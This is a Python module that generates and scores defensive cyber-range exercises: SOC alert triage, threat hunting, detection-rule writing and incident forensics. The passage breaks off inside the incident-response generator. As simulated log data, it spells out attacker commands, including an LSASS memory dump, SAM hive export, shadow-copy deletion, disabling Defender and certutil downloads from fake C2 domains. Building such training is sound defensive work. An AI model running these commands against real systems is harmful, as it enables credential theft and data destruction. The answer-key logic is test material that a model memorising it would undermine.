"""Scenario generators + graders, keyed by each ranger's scenario seed.

The generator is a pure function of the seed, so the same seed reproduces the
same world and the same answer key. The key is produced here, on the server,
and never leaves it: candidates get the dataset with the key stripped, submit
their analysis, and the server re-derives the key from the seed to score them.
That is what keeps grading answer-free and un-gameable, and what makes a
returning ranger's different seed a genuinely different exercise.

Boards 1 (SOC triage) and 2 (threat hunting) are implemented here. Boards 3-6
follow the same shape: generate(seed) -> scenario, public_view(scenario),
score(scenario, sub).
"""
import datetime as _dt
import hashlib as _hashlib
import random as _random

import detect as _detect

# --- board 1: SOC triage ----------------------------------------------------
# GOAD-themed estate. Malicious alerts carry a technique whose raw log makes the
# technique determinable; benign alerts are low-severity noise.
_HOSTS = ["kingslanding", "winterfell", "castelblack", "meereen", "braavos", "dragonstone"]
_USERS = ["jon.snow", "arya.stark", "tyrion.lannister", "jaime.lannister",
          "cersei.lannister", "samwell.tarly", "brienne.tarth", "sansa.stark"]

# technique -> (id, how the raw log reads) so a diligent analyst can classify it.
_TP_TECHNIQUES = [
    ("T1110.003", "Password Spraying",
     "{n} failed NTLM logons across {m} accounts from {src} in 4 min, then 1 success for {user}"),
    ("T1078", "Valid Accounts",
     "Interactive logon for {user} from {src} at 03:1{d} (outside normal hours, no prior auth)"),
    ("T1021.002", "SMB / Admin Shares",
     "ADMIN$ share access on {dst} by {user} from {src}, followed by service creation"),
    ("T1003.001", "LSASS Memory",
     "Handle to lsass.exe opened by non-system process on {dst} (sekurlsa-style access) as {user}"),
    ("T1053.005", "Scheduled Task",
     "Scheduled task 'Updater' created on {dst} by {user} running a base64 powershell payload"),
    ("T1047", "Windows Management Instrumentation",
     "wmiprvse spawned cmd.exe on {dst} via remote WMI from {src} as {user}"),
]
_BENIGN = [
    "Password change for {user} via self-service portal",
    "New device enrollment for {user} (MDM)",
    "VPN login for {user} from a known corporate IP",
    "Windows Update installed KB50{d}321 on {dst}",
    "Scheduled backup job completed on {dst}",
    "Account {user} added to distribution group 'allstaff'",
]
_SEVERITIES = ["medium", "high", "critical"]


def _mkuser(login, host):
    return host.split(".")[0] + "\\" + login.split(".")[0]


def generate_board1(seed, variant=None):
    """Seed-deterministic SOC triage alert portfolio. When `variant` (an approved structural
    variant from siem/board_variants) is supplied, the technique pool, benign look-alike pool and
    true-positive density come from the variant, so two cohorts on different variants face materially
    different triage challenges (different attack behaviors, FP patterns and technique distributions),
    not renamed hosts. variant=None preserves the original behavior exactly."""
    v = variant or {}
    tp_pool = v.get("tp_techniques") or _TP_TECHNIQUES
    benign_pool = v.get("benign") or _BENIGN
    lo, hi = v.get("tp_count", (4, 7))
    r = _random.Random("board1:%s:%s" % (v.get("id", ""), seed))
    n = r.randint(12, 16)
    attacker_user = r.choice(_USERS)
    attacker_src = r.choice(_HOSTS)
    base = _dt.datetime(2026, 3, r.randint(1, 20), r.randint(0, 5), r.randint(0, 59))
    tp_count = r.randint(lo, hi)

    alerts = []
    for i in range(n):
        aid = "ALRT-%04d" % (1000 + i)
        ts = (base + _dt.timedelta(minutes=r.randint(0, 600))).isoformat()
        if i < tp_count:
            tid, tname, tmpl = r.choice(tp_pool)
            dst = r.choice([h for h in _HOSTS if h != attacker_src])
            raw = tmpl.format(n=r.randint(18, 45), m=r.randint(6, 20), src=attacker_src,
                              dst=dst, user=attacker_user, d=r.randint(0, 9))
            key = {"verdict": "true_positive", "severity": r.choice(_SEVERITIES),
                   "technique": tid,
                   "iocs": sorted({attacker_src, _mkuser(attacker_user, dst)})}
            signal = tname
            host = dst
        else:
            victim = r.choice(_USERS)
            dst = r.choice(_HOSTS)
            raw = r.choice(benign_pool).format(user=victim, dst=dst, d=r.randint(0, 9))
            key = {"verdict": "false_positive", "severity": "low",
                   "technique": None, "iocs": []}
            signal = "Routine activity"
            host = dst
        alerts.append({"id": aid, "timestamp": ts, "host": host,
                       "signal": signal, "raw": raw, "_key": key})
    r.shuffle(alerts)
    return {"board": 1, "cohort_theme": "sevenkingdoms.local", "variant": v.get("id"),
            "attacker": {"src": attacker_src, "user": attacker_user},  # for the key only
            "alerts": alerts}


def public_board1(scenario):
    """The investigation surface: alerts with the answer key stripped."""
    return {"board": 1, "theme": scenario["cohort_theme"],
            "alerts": [{"id": a["id"], "timestamp": a["timestamp"], "host": a["host"],
                        "signal": a["signal"], "raw": a["raw"]} for a in scenario["alerts"]]}


def _norm(s):
    return (str(s or "").strip().lower())


def _ioc_overlap(sub, key):
    if not key:
        return 1.0 if not sub else 0.6  # no iocs expected; penalize spurious slightly
    subset = {_norm(x) for x in (sub or [])}
    keyset = {_norm(x) for x in key}
    if not keyset:
        return 1.0
    inter = len(subset & keyset)
    # recall of the real IOCs, lightly penalizing extras
    recall = inter / len(keyset)
    extra_pen = 0.1 * max(0, len(subset - keyset))
    return max(0.0, recall - extra_pen)


def score_board1(scenario, submission):
    """Score a triage submission against the hidden key. Returns
    (score_0_100, per_alert) where per_alert reveals correctness flags only,
    never the correct values."""
    key_by_id = {a["id"]: a["_key"] for a in scenario["alerts"]}
    sub_by_id = {}
    for a in (submission.get("alerts") or []):
        if isinstance(a, dict) and a.get("id"):
            sub_by_id[str(a["id"]).strip()] = a

    earned = 0.0
    total = 0.0
    per_alert = []
    for aid, key in key_by_id.items():
        is_tp = key["verdict"] == "true_positive"
        # weights: verdict 1.0, severity 0.4, technique 0.4 (TP only), iocs 0.2 (TP only)
        w_verdict, w_sev = 1.0, 0.4
        w_tech = 0.4 if is_tp else 0.0
        w_ioc = 0.2 if is_tp else 0.0
        total += w_verdict + w_sev + w_tech + w_ioc

        s = sub_by_id.get(aid, {})
        v_ok = _norm(s.get("verdict")) == key["verdict"]
        sev_ok = _norm(s.get("severity")) == _norm(key["severity"])
        tech_ok = (not is_tp) or (_norm(s.get("attack_technique")) == _norm(key["technique"]))
        ioc_ratio = _ioc_overlap(s.get("iocs"), key["iocs"]) if is_tp else 1.0

        earned += (w_verdict if v_ok else 0) + (w_sev if sev_ok else 0)
        earned += (w_tech if tech_ok else 0)
        earned += w_ioc * ioc_ratio
        per_alert.append({"id": aid, "verdict_correct": v_ok,
                          "severity_correct": sev_ok,
                          "technique_correct": (tech_ok if is_tp else None)})

    score = round(100.0 * earned / total, 1) if total else 0.0
    return score, per_alert


# --- board 2: threat hunting ------------------------------------------------
# A quiet corporate estate: no alert fired. The ranger is handed raw telemetry
# (process / auth / network / dns events) and must HUNT the intrusion out of a
# large benign baseline. Not flagging an event asserts it is benign, so the
# skill under test is detection with precision: find the whole kill chain
# without drowning in false leads. Scoring is class-balanced (F1 over the
# malicious set), so marking everything benign scores zero.
_B2_HOSTS = ["WKS-0471", "WKS-0088", "WKS-1120", "WKS-0233",
             "SRV-APP01", "SRV-FILE02", "SRV-SQL03", "SRV-DC01"]
_B2_USERS = ["m.okafor", "s.petrov", "l.nguyen", "d.reyes",
             "a.haddad", "k.yilmaz", "r.santos", "j.abara"]
_B2_C2 = ["cdn-telemetry-sync.com", "updates-cache-cdn.net", "api-metrics-collector.io",
          "static-assets-pool.co", "edge-node-telemetry.net", "mirror-pkg-delivery.net"]

# Kill-chain steps. {U} user, {H} patient-zero host, {dst} lateral target,
# {C2} attacker domain, {b64} encoded blob. Placeholders present in the detail
# drive the IOC set, so a hunter who pivots on the right entities is rewarded.
_B2_CHAIN = [
    ("T1059.001", "PowerShell (hidden, encoded)", "process",
     "winword.exe spawned powershell.exe -nop -w hidden -enc {b64} ({U} on {H})"),
    ("T1105", "Ingress Tool Transfer", "process",
     "certutil.exe -urlcache -split -f https://{C2}/update.bin on {H} by {U}"),
    ("T1087.002", "Account Discovery", "process",
     "{U} ran 'net group \"Domain Admins\" /domain' on {H}"),
    ("T1003.001", "LSASS Memory (comsvcs MiniDump)", "process",
     "rundll32.exe comsvcs.dll MiniDump <lsass-pid> full dump.bin ({U} on {H})"),
    ("T1047", "WMI Lateral Movement", "process",
     "wmic /node:{dst} process call create 'cmd /c update.bin' from {H} as {U}"),
    ("T1021.006", "WinRM Remote Session", "network",
     "WinRM 5985/tcp session {H} -> {dst} authenticated as {U} (no prior WinRM baseline)"),
    ("T1570", "Lateral Tool Transfer", "network",
     "SMB write to \\\\{dst}\\ADMIN$\\update.bin from {H} by {U}"),
    ("T1053.005", "Scheduled Task Persistence", "process",
     "schtasks /create /ru SYSTEM /tn 'MicrosoftEdgeUpdateX' /tr powershell on {H}"),
    ("T1071.001", "Web C2 Beaconing", "network",
     "{H} -> {C2}:443 HTTPS beacon every 60s, ~1.2KB, 8h duration, rare JA3"),
    ("T1048.003", "Exfiltration over DNS", "dns",
     "{H} -> {C2} 240 TXT lookups, high-entropy labels, ~3MB over 20m"),
]
_B2_BENIGN = [
    ("process", "{U} launched Outlook.exe on {H}"),
    ("process", "GoogleUpdate.exe ran maintenance task on {H}"),
    ("process", "Teams.exe autostarted for {U} on {H}"),
    ("process", "msedge.exe launched by {U} on {H}"),
    ("process", "python.exe ran the nightly report on {H}"),
    ("process", "OneDrive.exe sync for {U} on {H}"),
    ("auth", "{U} interactive logon to {H} from jump host SRV-JUMP01"),
    ("auth", "Kerberos TGT issued for {U} by SRV-DC01"),
    ("auth", "{U} unlocked workstation {H}"),
    ("network", "{H} -> windowsupdate.microsoft.com HTTPS"),
    ("network", "{H} -> outlook.office365.com HTTPS"),
    ("network", "{H} SMB read from \\\\SRV-FILE02\\shared"),
    ("dns", "{H} -> aka.ms A"),
    ("dns", "{H} -> teams.microsoft.com A"),
    ("dns", "{H} -> {dst}.corp.local A"),
]


def _b2_iocs(tmpl, U, H, dst, C2):
    """IOCs a hunter should pivot on, derived from what the detail references."""
    iocs = {"corp\\" + U.split(".")[-1], H}
    if "{dst}" in tmpl:
        iocs.add(dst)
    if "{C2}" in tmpl:
        iocs.add(C2)
    return sorted(iocs)


def generate_board2(seed):
    r = _random.Random("board2:" + str(seed))
    user = r.choice(_B2_USERS)
    host = r.choice([h for h in _B2_HOSTS if h.startswith("WKS")])  # patient zero
    dst = r.choice([h for h in _B2_HOSTS if h != host])
    c2 = r.choice(_B2_C2)
    base = _dt.datetime(2026, 4, r.randint(1, 20), r.randint(7, 18), r.randint(0, 59))

    # The intrusion: a coherent, contiguous subset of the kill chain (7-10 steps,
    # always starting at initial access) so every seed is a different hunt.
    tp_count = r.randint(7, 10)
    chain = _B2_CHAIN[:tp_count]
    benign_count = r.randint(38, 52)

    events = []
    # malicious events, spaced through a tight attack window
    for tid, tname, etype, tmpl in chain:
        detail = tmpl.format(U=user, H=host, dst=dst, C2=c2,
                             b64="JAB" + "".join(r.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
                                                 for _ in range(10)) + "==")
        key = {"verdict": "true_positive", "severity": r.choice(_SEVERITIES),
               "technique": tid, "iocs": _b2_iocs(tmpl, user, host, dst, c2)}
        events.append({"etype": etype, "user": user, "host": host,
                       "signal": tname, "detail": detail, "_key": key,
                       "_t": r.randint(0, 180)})
    # benign baseline across the whole estate and day
    for _ in range(benign_count):
        etype, tmpl = r.choice(_B2_BENIGN)
        bu = r.choice(_B2_USERS)
        bh = r.choice(_B2_HOSTS)
        bdst = r.choice([h for h in _B2_HOSTS if h != bh])
        detail = tmpl.format(U=bu, H=bh, dst=bdst)
        key = {"verdict": "false_positive", "severity": "low", "technique": None, "iocs": []}
        events.append({"etype": etype, "user": bu, "host": bh,
                       "signal": "Routine activity", "detail": detail, "_key": key,
                       "_t": r.randint(0, 1440)})

    r.shuffle(events)
    alerts = []
    for i, e in enumerate(events):
        ts = (base + _dt.timedelta(minutes=e["_t"])).isoformat()
        alerts.append({"id": "EVT-%04d" % (2000 + i), "timestamp": ts,
                       "host": e["host"], "user": e["user"], "event_type": e["etype"],
                       "signal": e["signal"], "detail": e["detail"], "_key": e["_key"]})
    return {"board": 2, "cohort_theme": "corp.local",
            "intrusion": {"user": user, "host": host, "dst": dst, "c2": c2},  # key only
            "alerts": alerts}


def public_board2(scenario):
    """The hunting surface: raw telemetry, no alerts, key stripped."""
    return {"board": 2, "theme": scenario["cohort_theme"],
            "alerts": [{"id": a["id"], "timestamp": a["timestamp"], "host": a["host"],
                        "user": a["user"], "event_type": a["event_type"],
                        "detail": a["detail"]} for a in scenario["alerts"]]}


def score_board2(scenario, submission):
    """Class-balanced hunt scoring. An omitted event is read as a benign call,
    so the score is F1 over the malicious set (find the whole chain without
    false leads) plus technique and IOC quality on confirmed finds. Marking
    everything benign scores 0. Feedback is correctness flags only."""
    key_by_id = {a["id"]: a["_key"] for a in scenario["alerts"]}
    sub_by_id = {}
    for a in (submission.get("alerts") or []):
        if isinstance(a, dict) and a.get("id"):
            sub_by_id[str(a["id"]).strip()] = a

    truth_tp = {i for i, k in key_by_id.items() if k["verdict"] == "true_positive"}
    called_tp = set()
    per_alert = []
    for aid, key in key_by_id.items():
        s = sub_by_id.get(aid, {})
        verdict = _norm(s.get("verdict")) or "false_positive"  # omitted => benign
        is_tp = key["verdict"] == "true_positive"
        v_ok = verdict == key["verdict"]
        sev_ok = _norm(s.get("severity")) == _norm(key["severity"])
        tech_ok = (not is_tp) or (_norm(s.get("attack_technique")) == _norm(key["technique"]))
        if verdict == "true_positive":
            called_tp.add(aid)
        per_alert.append({"id": aid, "verdict_correct": v_ok, "severity_correct": sev_ok,
                          "technique_correct": (tech_ok if is_tp else None)})

    found = called_tp & truth_tp
    recall = len(found) / len(truth_tp) if truth_tp else 1.0
    precision = (len(found) / len(called_tp)) if called_tp else (1.0 if not truth_tp else 0.0)
    f1 = (2 * precision * recall / (precision + recall)) if (precision + recall) else 0.0

    tech_q, ioc_q = [], []
    for aid in found:
        key, s = key_by_id[aid], sub_by_id.get(aid, {})
        tech_q.append(1.0 if _norm(s.get("attack_technique")) == _norm(key["technique"]) else 0.0)
        ioc_q.append(_ioc_overlap(s.get("iocs"), key["iocs"]))
    tech_score = (sum(tech_q) / len(tech_q)) if tech_q else 0.0
    ioc_score = (sum(ioc_q) / len(ioc_q)) if ioc_q else 0.0

    score = round(100.0 * (0.70 * f1 + 0.20 * tech_score + 0.10 * ioc_score), 1)
    return score, per_alert


# --- board 3: detection engineering -----------------------------------------
# The ranger is handed labeled malicious samples (the behaviors to detect) and a
# benign baseline that includes near-miss decoys (a legit certutil, a legit
# powershell, a legit schtasks query...). They author detection rules. We grade
# by running those rules against a HOLDOUT corpus generated from the same seed:
# fresh variants of the same techniques (new hosts, users, blobs, domains) plus
# fresh benign. A rule that keys on the invariant tradecraft generalizes and
# scores; a rule overfit to the sample string catches nothing in the holdout; a
# lazy image-only rule gets punished by the near-miss benigns on precision.
_B3_HOSTS = ["WKS-0471", "WKS-0088", "WKS-1120", "WKS-0233", "WKS-0355",
             "SRV-APP01", "SRV-FILE02", "SRV-SQL03"]
_B3_USERS = ["m.okafor", "s.petrov", "l.nguyen", "d.reyes", "a.haddad",
             "k.yilmaz", "r.santos", "j.abara", "t.flores"]
_B3_C2 = ["cdn-telemetry-sync.com", "updates-cache-cdn.net", "api-metrics-collector.io",
          "static-assets-pool.co", "edge-node-telemetry.net", "mirror-pkg-delivery.net"]
# The intrusion's techniques, in kill-chain order. Every seed must cover these.
_B3_TECHNIQUES = ["T1059.001", "T1105", "T1087.002", "T1003.001",
                  "T1047", "T1053.005", "T1071.001", "T1048.003"]
_B3_TNAME = {
    "T1059.001": "Encoded PowerShell from Office",
    "T1105": "Ingress tool transfer (certutil)",
    "T1087.002": "Domain account discovery",
    "T1003.001": "LSASS dump via comsvcs",
    "T1047": "WMI lateral movement",
    "T1053.005": "Scheduled-task persistence",
    "T1071.001": "Web C2 beaconing",
    "T1048.003": "Exfiltration over DNS",
    # expanded catalog (S4) - enables detection-engineering variants with different technique sets
    "T1003.002": "SAM hive dump via reg save",
    "T1136.001": "Local account creation",
    "T1562.001": "Disable security tooling",
    "T1490": "Inhibit system recovery (shadow delete)",
    "T1552.001": "Credential search in files",
    "T1569.002": "Service execution (sc create)",
}


def _b3_tok(r, n):
    return "".join(r.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(n))


def _b3_mal(r, tech):
    """A malicious event for a technique, with randomized but behavior-preserving
    fields. The invariant tradecraft (image + command tokens) is what a good rule
    keys on; everything else varies per instance."""
    H, U, dst, dom = r.choice(_B3_HOSTS), r.choice(_B3_USERS), r.choice(_B3_HOSTS), r.choice(_B3_C2)
    e = {"event_type": "process", "host": H, "user": U, "image": "", "parent": "",
         "command": "", "dest": "", "domain": ""}
    if tech == "T1059.001":
        e.update(image="powershell.exe", parent=r.choice(["winword.exe", "excel.exe", "outlook.exe"]),
                 command="powershell.exe -nop -w hidden -enc JAB%s==" % _b3_tok(r, 14))
    elif tech == "T1105":
        e.update(image="certutil.exe", parent="cmd.exe", domain=dom,
                 command="certutil.exe -urlcache -split -f https://%s/%s.bin" % (dom, _b3_tok(r, 6)))
    elif tech == "T1087.002":
        e.update(image="net.exe", parent="cmd.exe",
                 command=r.choice(['net.exe group "Domain Admins" /domain',
                                   'net.exe group "Enterprise Admins" /domain']))
    elif tech == "T1003.001":
        e.update(image="rundll32.exe", parent="cmd.exe",
                 command="rundll32.exe comsvcs.dll MiniDump %d C:\\ProgramData\\%s.dmp full"
                         % (r.randint(500, 1500), _b3_tok(r, 5)))
    elif tech == "T1047":
        e.update(image="wmic.exe", parent="cmd.exe", dest=dst,
                 command="wmic.exe /node:%s process call create \"cmd /c %s.bat\"" % (dst, _b3_tok(r, 5)))
    elif tech == "T1053.005":
        e.update(image="schtasks.exe", parent="cmd.exe",
                 command="schtasks.exe /create /ru SYSTEM /tn %s /tr \"powershell -w hidden -f c:\\%s.ps1\" /sc onlogon"
                         % (_b3_tok(r, 6), _b3_tok(r, 5)))
    elif tech == "T1071.001":
        e.update(event_type="network", dest=dom, domain=dom,
                 command="HTTPS beacon to %s every 60s ~1.2KB over 8h" % dom)
    elif tech == "T1048.003":
        e.update(event_type="dns", domain=dom,
                 command="240 TXT queries to %s, high-entropy labels, ~3MB over 20m" % dom)
    elif tech == "T1003.002":
        e.update(image="reg.exe", parent="cmd.exe",
                 command="reg.exe save HKLM\\SAM C:\\ProgramData\\%s.sav" % _b3_tok(r, 5))
    elif tech == "T1136.001":
        e.update(image="net.exe", parent="cmd.exe",
                 command="net.exe user svc_%s P@ss%s /add" % (_b3_tok(r, 4), _b3_tok(r, 4)))
    elif tech == "T1562.001":
        e.update(image="powershell.exe", parent=r.choice(["cmd.exe", "explorer.exe"]),
                 command="powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")
    elif tech == "T1490":
        e.update(image="vssadmin.exe", parent="cmd.exe",
                 command="vssadmin.exe delete shadows /all /quiet")
    elif tech == "T1552.001":
        e.update(image="findstr.exe", parent="cmd.exe",
                 command="findstr.exe /si password C:\\Users\\%s\\*.config" % _b3_tok(r, 4))
    elif tech == "T1569.002":
        e.update(image="sc.exe", parent="cmd.exe", dest=dst,
                 command="sc.exe \\\\%s create %s binPath= c:\\%s.exe start= auto"
                         % (dst, _b3_tok(r, 5), _b3_tok(r, 5)))
    return e


# Benign builders, several of them deliberate near-misses for a specific
# technique: they share the image but not the malicious command tokens, so an
# image-only rule false-positives here and loses precision.
def _b3_benign(r):
    H, U = r.choice(_B3_HOSTS), r.choice(_B3_USERS)
    choices = [
        {"event_type": "process", "image": "certutil.exe", "parent": "cmd.exe",
         "command": "certutil.exe -hashfile C:\\Users\\%s\\Downloads\\setup.exe SHA256" % U.split(".")[-1]},
        {"event_type": "process", "image": "powershell.exe", "parent": "explorer.exe",
         "command": "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\inventory.ps1"},
        {"event_type": "process", "image": "net.exe", "parent": "cmd.exe",
         "command": "net.exe use Z: \\\\SRV-FILE02\\shared"},
        {"event_type": "process", "image": "rundll32.exe", "parent": "explorer.exe",
         "command": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl"},
        {"event_type": "process", "image": "schtasks.exe", "parent": "cmd.exe",
         "command": "schtasks.exe /query /fo LIST /v"},
        {"event_type": "process", "image": "wmic.exe", "parent": "cmd.exe",
         "command": "wmic.exe logicaldisk get caption,freespace"},
        {"event_type": "process", "image": "outlook.exe", "parent": "explorer.exe",
         "command": "outlook.exe"},
        {"event_type": "process", "image": "msedge.exe", "parent": "explorer.exe",
         "command": "msedge.exe --profile-directory=Default"},
        {"event_type": "network", "dest": "windowsupdate.microsoft.com",
         "domain": "windowsupdate.microsoft.com", "command": "HTTPS to windowsupdate.microsoft.com"},
        {"event_type": "network", "dest": "outlook.office365.com",
         "domain": "outlook.office365.com", "command": "HTTPS to outlook.office365.com"},
        {"event_type": "dns", "domain": "teams.microsoft.com", "command": "A query teams.microsoft.com"},
        {"event_type": "dns", "domain": "aka.ms", "command": "A query aka.ms"},
        # near-misses for the expanded catalog: same image, legitimate command (no malicious tokens)
        {"event_type": "process", "image": "reg.exe", "parent": "cmd.exe",
         "command": "reg.exe query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion /v ProgramFilesDir"},
        {"event_type": "process", "image": "net.exe", "parent": "cmd.exe",
         "command": "net.exe user %USERNAME%"},
        {"event_type": "process", "image": "powershell.exe", "parent": "explorer.exe",
         "command": "powershell.exe Get-MpComputerStatus | Select RealTimeProtectionEnabled"},
        {"event_type": "process", "image": "vssadmin.exe", "parent": "cmd.exe",
         "command": "vssadmin.exe list shadows"},
        {"event_type": "process", "image": "findstr.exe", "parent": "cmd.exe",
         "command": "findstr.exe /i error C:\\Logs\\app.log"},
        {"event_type": "process", "image": "sc.exe", "parent": "cmd.exe",
         "command": "sc.exe query spooler"},
    ]
    e = {"event_type": "process", "host": H, "user": U, "image": "", "parent": "",
         "command": "", "dest": "", "domain": ""}
    e.update(r.choice(choices))
    e["host"], e["user"] = H, U
    return e


def _b3_corpus(r, techniques, k_per_tech, benign_count):
    corpus = []
    for tech in techniques:
        for _ in range(k_per_tech):
            e = _b3_mal(r, tech)
            e["_label"], e["_tech"] = "malicious", tech
            corpus.append(e)
    for _ in range(benign_count):
        e = _b3_benign(r)
        e["_label"], e["_tech"] = "benign", None
        corpus.append(e)
    r.shuffle(corpus)
    return corpus


def generate_board3(seed, variant=None):
    """The SHOWN requirements: one labeled sample per technique plus a benign
    baseline (with near-miss decoys). Grading uses a hidden holdout derived from
    the same seed, so nothing secret lives in what the ranger receives.

    When `variant` is supplied, the technique set to detect comes from the variant, so two cohorts
    face different detection-engineering problems: a ruleset built for one cohort's techniques does
    not automatically cover another's. variant=None preserves the original eight-technique set."""
    v = variant or {}
    r = _random.Random("board3:shown:%s:%s" % (v.get("id", ""), seed))
    techniques = list(v.get("techniques") or _B3_TECHNIQUES)
    threats = []
    for tech in techniques:
        e = _b3_mal(r, tech)
        threats.append({"technique": tech, "name": _B3_TNAME[tech],
                        "event_type": e["event_type"], "host": e["host"], "user": e["user"],
                        "image": e["image"], "parent": e["parent"], "command": e["command"],
                        "dest": e["dest"], "domain": e["domain"]})
    baseline = []
    for _ in range(14):
        e = _b3_benign(r)
        baseline.append({k: e[k] for k in ("event_type", "host", "user", "image",
                                           "parent", "command", "dest", "domain")})
    return {"board": 3, "_seed": str(seed), "_variant": v.get("id"), "_techniques": techniques,
            "cohort_theme": "corp.local", "threats": threats, "baseline": baseline}


def public_board3(scenario):
    """Detection requirements. The malicious samples are intel (labeled on
    purpose); the holdout they'll be graded on is never exposed."""
    return {"board": 3, "theme": scenario["cohort_theme"],
            "detectable_fields": sorted(_detect.FIELDS),
            "threats": scenario["threats"], "baseline": scenario["baseline"]}


def score_board3(scenario, submission):
    """Compile the ruleset and run it against a seeded holdout. Score is the F1
    of macro-recall (mean per-technique detection, so no technique can be
    skipped) and precision (benign events must stay quiet). Feedback is
    validation metrics and per-rule firing counts, never the holdout contents."""
    seed = scenario.get("_seed", "")
    techniques = scenario.get("_techniques", list(_B3_TECHNIQUES))
    holdout = _b3_corpus(_random.Random("board3:holdout:%s:%s" % (scenario.get("_variant", ""), seed)),
                         techniques, k_per_tech=4, benign_count=60)

    rules = submission.get("rules") if isinstance(submission, dict) else None
    matchers, errors = _detect.compile_ruleset(rules or [])

    mal = [e for e in holdout if e["_label"] == "malicious"]
    ben = [e for e in holdout if e["_label"] == "benign"]
    per_rule = {name: {"malicious": 0, "benign": 0} for name, _ in matchers}

    def detected(ev):
        hit = False
        for name, fn in matchers:
            try:
                if fn(ev):
                    hit = True
                    per_rule[name]["malicious" if ev["_label"] == "malicious" else "benign"] += 1
            except _detect.RuleError:
                pass
        return hit

    det_mal = {t: 0 for t in techniques}
    tot_mal = {t: 0 for t in techniques}
    for e in mal:
        tot_mal[e["_tech"]] += 1
        if detected(e):
            det_mal[e["_tech"]] += 1
    fp = sum(1 for e in ben if detected(e))

    per_tech_recall = [(det_mal[t] / tot_mal[t]) if tot_mal[t] else 1.0 for t in techniques]
    macro_recall = sum(per_tech_recall) / len(per_tech_recall) if per_tech_recall else 0.0
    total_det_mal = sum(det_mal.values())
    precision = (total_det_mal / (total_det_mal + fp)) if (total_det_mal + fp) else 0.0
    f1 = (2 * macro_recall * precision / (macro_recall + precision)) if (macro_recall + precision) else 0.0
    score = round(100.0 * f1, 1)

    covered = sum(1 for t in techniques if det_mal[t] > 0)
    feedback = {
        "techniques_covered": "%d/%d" % (covered, len(techniques)),
        "validation_false_positives": fp,
        "macro_recall": round(macro_recall, 3),
        "precision": round(precision, 3),
        "rules": [{"name": n, "fired_malicious": per_rule[n]["malicious"],
                   "fired_benign": per_rule[n]["benign"]} for n, _ in matchers],
        "rule_errors": errors,
    }
    # Shape the second return value like a per-item list so the API stays uniform.
    return score, [feedback]


# --- board 4: incident response / forensics ---------------------------------
# The breach already happened. The ranger is handed multi-host forensic evidence
# (an incident woven through benign noise) and must produce an IR report: scope
# the compromise (which hosts and accounts), name the initial-access vector and
# patient zero, reconstruct the kill-chain timeline in order, and flag the
# persistence to remove. Graded answer-free against the incident ground truth
# derived from the seed.
_B4_HOSTS = ["WKS-0471", "WKS-0088", "WKS-1120", "WKS-0233", "WKS-0355",
             "SRV-APP01", "SRV-FILE02", "SRV-SQL03", "SRV-DC01"]
_B4_USERS = ["m.okafor", "s.petrov", "l.nguyen", "d.reyes", "a.haddad",
             "k.yilmaz", "r.santos", "j.abara", "t.flores"]
_B4_PRIV = ["svc_backup", "svc_sql", "adm.helpdesk", "da.admin"]
_B4_C2 = ["cdn-telemetry-sync.com", "updates-cache-cdn.net", "api-metrics-collector.io",
          "static-assets-pool.co", "edge-node-telemetry.net"]
_B4_VECTORS = [
    ("T1566.001", "Spearphishing Attachment", "process",
     "winword.exe opened invoice_{tok}.docm then spawned powershell.exe -enc on {H} ({U})"),
    ("T1078", "Valid Accounts",  "auth",
     "VPN + interactive logon for {U} from external 203.0.113.{d} to {H}, no MFA challenge"),
    ("T1190", "Exploit Public-Facing Application", "process",
     "w3wp.exe on {H} spawned cmd.exe after POST /upload.aspx (webshell dropped) by {U}"),
]


def _b4_acct(u):
    return "corp\\" + u


# Default IR kill chain (legacy behavior) as a declarative template consumed by generate_board4.
# Each step: (technique, event_type, host_role, acct_role, detail_template, is_persistence).
# host_role in {pz,dst,third}; acct_role in {u1,u2}; the detail template may reference
# {pz} {dst} {third} {u1} {u2} {u1acct} {u2acct} {c2} {tok}. A step whose host_role is `third` is
# included only when the incident uses a third host.
_B4_DEFAULT_CHAIN = [
    ("T1059.001", "process", "pz", "u1",
     "powershell.exe -nop -w hidden -enc JAB{tok}== on {pz}", False),
    ("T1087.002", "process", "pz", "u1", 'net.exe group "Domain Admins" /domain on {pz}', False),
    ("T1003.001", "process", "pz", "u1",
     "rundll32.exe comsvcs.dll MiniDump lsass -> {tok}.dmp on {pz}", False),
    ("T1021.002", "auth", "dst", "u2",
     "ADMIN$ logon to {dst} as {u2acct} from {pz}, then service create", False),
    ("T1053.005", "process", "dst", "u2",
     "schtasks /create /ru SYSTEM /tn 'EdgeUpdateX' /tr powershell on {dst}", True),
    ("T1021.002", "auth", "third", "u2", "ADMIN$ logon to {third} as {u2acct} from {dst}", False),
    ("T1071.001", "network", "dst", "u2", "{dst} -> {c2}:443 HTTPS beacon every 60s, 8h", False),
    ("T1048.003", "dns", "dst", "u2", "{dst} -> {c2} 200+ TXT lookups, ~2MB exfil", False),
]


def generate_board4(seed, variant=None):
    """Seed-deterministic IR / forensics incident. When `variant` is supplied the initial-access
    vector pool, the ordered kill chain (techniques, order, lateral pattern), the persistence
    mechanism and whether a third host is involved all come from the variant, so two cohorts
    investigate materially different incidents, not the same chain with renamed users. variant=None
    reproduces the original incident shape. The ground-truth grading contract (patient zero, initial
    access, scope, timeline, persistence) is unchanged."""
    v = variant or {}
    vectors = v.get("vectors") or _B4_VECTORS
    chain = v.get("chain") or _B4_DEFAULT_CHAIN
    r = _random.Random("board4:%s:%s" % (v.get("id", ""), seed))
    pz = r.choice(_B4_HOSTS)                                   # patient zero
    dst = r.choice([h for h in _B4_HOSTS if h != pz])         # lateral target
    use_third = v.get("use_third") if "use_third" in v else (r.random() < 0.5)
    third = r.choice([h for h in _B4_HOSTS if h not in (pz, dst)]) if use_third else None
    u1 = r.choice(_B4_USERS)                                   # initial account
    u2 = r.choice(_B4_PRIV)                                    # escalated account
    c2 = r.choice(v.get("c2_pool") or _B4_C2)
    vtid, vtname, vet, vtmpl = r.choice(vectors)
    base = _dt.datetime(2026, 5, r.randint(1, 20), r.randint(1, 6), r.randint(0, 59))

    _hosts = {"pz": pz, "dst": dst, "third": third}
    _accts = {"u1": u1, "u2": u2}
    fmt = {"pz": pz, "dst": dst, "third": third, "u1": u1, "u2": u2,
           "u1acct": _b4_acct(u1), "u2acct": _b4_acct(u2), "c2": c2, "m": r.randint(6, 30)}

    # Ordered kill chain: initial access from the vector pool, then the variant's chain.
